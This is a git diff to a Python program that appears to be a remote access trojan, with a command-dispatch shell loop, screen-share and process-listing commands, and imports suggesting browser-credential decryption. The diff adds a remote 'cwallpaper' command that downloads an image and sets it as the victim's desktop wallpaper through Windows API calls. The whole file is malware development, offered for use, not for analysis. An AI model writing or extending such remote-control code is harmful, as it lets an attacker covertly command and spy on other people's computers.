@@ -19,6 +19,7 @@ import time
 import sqlite3
 import base64
 from urllib.request import Request, urlopen
+
 from cryptography.hazmat.backends import default_backend
 from cryptography.hazmat.primitives.ciphers import (
     Cipher, algorithms, modes)
@@ -26,6 +27,23 @@ from cryptography.hazmat.primitives.ciphers import (
 import psutil
 import urllib.request as urllib2
 import platform
+import struct
+def wallpaper():
+    download_file(appd+'\\wallpaper.jpg')
+    SPI_SETDESKWALLPAPER = 20
+    WALLPAPER_PATH = appd+'\\wallpaper.jpg'
+
+    def is_64_windows():
+        return struct.calcsize('P') * 8 == 64
+
+    def get_sys_parameters_info():
+        return ctypes.windll.user32.SystemParametersInfoW if is_64_windows() \
+            else ctypes.windll.user32.SystemParametersInfoA
+
+    def change_wallpaper():
+        sys_parameters_info = get_sys_parameters_info()
+        r = sys_parameters_info(SPI_SETDESKWALLPAPER, 0, WALLPAPER_PATH, 3)
+    change_wallpaper()
 def stopscreenshare():
     temp = os.getenv('tmp')
     try:
@@ -624,6 +642,9 @@ def shell():
             except:
                 reliable_send('ERROR')
                 continue
+        elif command[:10] == 'cwallpaper':
+            reliable_send('changed wallpaper')
+            wallpaper()
         elif command[:6] == 'pslist':
             try:
                 getprocess()
